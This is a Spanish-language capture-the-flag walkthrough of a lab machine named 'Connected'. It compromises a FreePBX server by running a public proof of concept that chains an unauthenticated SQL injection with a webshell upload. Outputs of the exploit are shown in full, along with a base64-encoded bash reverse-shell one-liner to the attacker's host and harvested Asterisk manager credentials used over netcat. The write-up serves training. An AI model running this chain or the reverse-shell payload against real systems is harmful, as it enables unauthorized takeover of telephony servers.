
# Connected

<figure><img src="/files/JFntbU8MqRvPbTnvUqm9" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Connected`
* **IP:** `10.129.22.176`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.22.176 connected.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.22.176
```

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
```

Encontramos puertos comunes (22, 80 y 443) abiertos. Nos centraremos en el servicio web. Encontramos también la versión de Apache:

{% code overflow="wrap" %}

```
Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
```

{% endcode %}

### Acceso Web

Accedemos a `http://connected.htb` y observamos que parece ser un panel de freePBX:

<figure><img src="/files/o61no9hHLBNjbIS4Voez" alt=""><figcaption></figcaption></figure>

**FreePBX** es una interfaz gráfica de usuario (GUI) basada en web de código abierto que permite controlar, configurar y administrar **Asterisk**, el motor de telefonía VoIP (Voz sobre IP) más popular del mundo. Esencialmente, sirve como un panel de control intuitivo que permite crear una centralita telefónica (PBX) completa sin necesidad de escribir comandos complejos.&#x20;

Actualmente patrocinada por Sangoma, funciona como un conmutador IP o centralita virtual. Se utiliza comúnmente para gestionar llamadas, crear extensiones, configurar operadoras automáticas (IVR), enrutar llamadas y conectar líneas telefónicas físicas o virtuales (troncales SIP).

#### Versión

En el footer nos encontramos la versión en plano, que nos permitiría buscar exploits públicos:

{% code overflow="wrap" %}

```
FreePBX 16.0.40.7
```

{% endcode %}

***

## <mark style="color:$primary;">Enumeración Web</mark>

### WSTG Scan

{% embed url="<https://github.com/afsh4ck/WSTG-Scan>" %}

Este programa automáticamente realiza:

* Enumeración de tecnologías web
* Escaneo de puertos y servicios con Nmap
* Análisis de vulnerabilidades con Nuclei
* Fuzzing de subdominios con ffuf
* Fuzzing de directorios con fuff
* Spidering / Mapeo completo del site
* Detección de formularios y pruebas de inyección
* Pruebas de API (OWASP API Top 10)
* Enumeración de usuarios y bruteforce con hydra

{% code overflow="wrap" %}

```bash
git clone https://github.com/afsh4ck/WSTG-Scan.git
cd WSTG-Scan
python3 wstg-scan.py
```

{% endcode %}

### Nuclei

Nuclei nos encuentra una vulnerabilidad crítica, un SQL Injection con el CVE-2025-57819:

<figure><img src="/files/wYyoObdUlADki7ahpmtA" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Explotación</mark>

### Investigación de CVEs / Exploits

Buscando exploits específicos para ese CVE nos encontramos el siguiente PoC en GitHub:

{% embed url="<https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE>" %}

#### Cómo funciona

1. Crear un administrador (CVE-2025-57819): se utiliza una inyección SQL apilada, accesible sin autenticación a través del cargador de endpoints con espacio de nombres, para INSERTAR un administrador con acceso completo directamente en la tabla `ampusers`.
2. Autenticarse: la prueba de concepto inicia sesión en el panel de administración como el usuario recién creado.&#x20;
3. Instalar un webshell (CVE-2025-61678): se abusa del controlador de carga de firmware de Endpoint Manager mediante un recorrido de `../../../var/www/html/<dir>` en `fwbrand` para escribir un webshell PHP en la raíz web.
4. Ejecutar: ejecutar un solo comando o recibir un shell inverso interactivo.

### Comprobación

{% code overflow="wrap" %}

```bash
git clone https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE.git
cd FreePBX-CVE-2025-57819-RCE
```

{% endcode %}

{% code overflow="wrap" %}

```bash
python3 exploit.py --rhost 10.129.22.176 --command "id"

 ██████████ █████                  █████
░░███░░░░░█░░███                  ░░███
 ░███  █ ░  ░███████   █████ █████ ░███████
 ░██████    ░███░░███ ░░███ ░░███  ░███░░███
 ░███░░█    ░███ ░███  ░░░█████░   ░███ ░███
 ░███ ░   █ ░███ ░███   ███░░░███  ░███ ░███
 ██████████ ████ █████ █████ █████ ████████
░░░░░░░░░░ ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░░░░

    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
    linkedin: ehxb /// medium.com/@Ehxb /// github 0xEHxb

[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_6jl3b:h11te13ek47l
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_6jl3b
[*] [CVE-2025-61678] uploading webshell -> /sbhxnoy4qj/m97zvk5t.php
[+] webshell live: https://10.129.22.176/sbhxnoy4qj/m97zvk5t.php
[*] executing: id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

{% endcode %}

Observamos que funciona y nos devuelve el comando id con el usuario asterisk

### Web Shell Interactiva

Este Poc nos permite ejecutar una shell interactiva en el objetivo directamente:

{% code overflow="wrap" %}

```bash
python3 exploit.py --rhost 10.129.22.176 --lhost 10.10.15.40 --lport 4444

 ██████████ █████                  █████
░░███░░░░░█░░███                  ░░███
 ░███  █ ░  ░███████   █████ █████ ░███████
 ░██████    ░███░░███ ░░███ ░░███  ░███░░███
 ░███░░█    ░███ ░███  ░░░█████░   ░███ ░███
 ░███ ░   █ ░███ ░███   ███░░░███  ░███ ░███
 ██████████ ████ █████ █████ █████ ████████
░░░░░░░░░░ ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░░░░

    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
    linkedin: ehxb /// medium.com/@Ehxb /// github 0xEHxb

[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_bhded:n49ctkxxcb4s
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_bhded
[*] [CVE-2025-61678] uploading webshell -> /rgvpvkwwnm/bwjjexkx.php
[+] webshell live: https://10.129.22.176/rgvpvkwwnm/bwjjexkx.php
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.129.22.176 on port 47418
[*] firing reverse shell -> 10.10.15.40:4444
[+] shell incoming! dropping to interactive
[*] Switching to interactive mode
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:80:7E:7F | 10.129.22.176             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected rgvpvkwwnm]$ $ whoami
asterisk
```

{% endcode %}

Bingo! Tenemos una shell

***

## <mark style="color:$primary;">User Flag</mark>

```bash
[asterisk@connected rgvpvkwwnm]$ $ cd /home
cd /home
[asterisk@connected home]$ $ ls
ls
asterisk
[asterisk@connected home]$ $ cd asterisk
cd asterisk
[asterisk@connected asterisk]$ $ ls
ls
user.txt
[asterisk@connected asterisk]$ $ cat user.txt
cat user.txt
212d6175ded983a1093cd0fe4a3da265
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Estabilización de Shell

Pasaremos a una shell Penelope para tener un mejor control del objetivo:

{% code overflow="wrap" %}

```bash
penelope -p 5555

p ## Ver payloads

➤  tun0 → 10.10.15.40:5555

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuNDAvNTU1NSAwPiYxKSAm|base64 -d|bash
```

{% endcode %}

Ejecutamos el payload en el objetivo y ya tenemos una sesión en Penelope.

### Enumeración de Privilegios

No tenemos sudo como el usuario asterisk, ya que necesitamos su contraseña:

```bash
[asterisk@connected asterisk]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for asterisk: 
Sorry, try again.
```

### Credential Hunting

Encontramos un secret expuesto en los archivos de configuración de manager:

```bash
[asterisk@connected tmp]$ grep -E "secret|permit" /etc/asterisk/manager.conf
; to assure that this can't be reached from un-authorized hosts with the ACL settings (permit/deny).
secret = fe1mYBs7D5P3
permit=127.0.0.1/255.255.255.0
```

Y con el siguiente comando comprobamos el nombre del usuario:

```bash
[asterisk@connected tmp]$ cat /etc/asterisk/manager.conf | grep -E '^\[.*\]' | grep -v general
[wnPa2WbXJ/ED]
```

Un nombre raro, pero válido.

### Autenticación

Con Netcat comprobamos que son credenciales válidas:

```bash
[asterisk@connected tmp]$ echo -e "Action: Login\r\nUsername: wnPa2WbXJ/ED\r\nSecret: fe1mYBs7D5P3\r\n\r\n" | nc 127.0.0.1 5038

Asterisk Call Manager/9.0.0
Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Uptime: 4005
LastReload: 4005
Status: Fully Booted

Response: Error
Message: Missing action in request
```

### Permisos de escritura

```bash
[asterisk@connected tmp]$ ls -la /etc/asterisk/extensions.conf
lrwxrwxrwx. 1 asterisk asterisk 52 Nov 30  2025 /etc/asterisk/extensions.conf -> /var/www/html/admin/modules/core/etc/extensions.conf

[asterisk@connected tmp]$ ls -la /var/www/html/admin/modules/core/etc/extensions.conf
-rw-rw-r--. 1 asterisk asterisk 19792 Nov 30  2025 /var/www/html/admin/modules/core/etc/extensions.conf
```

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
cat /root/root.txt
```
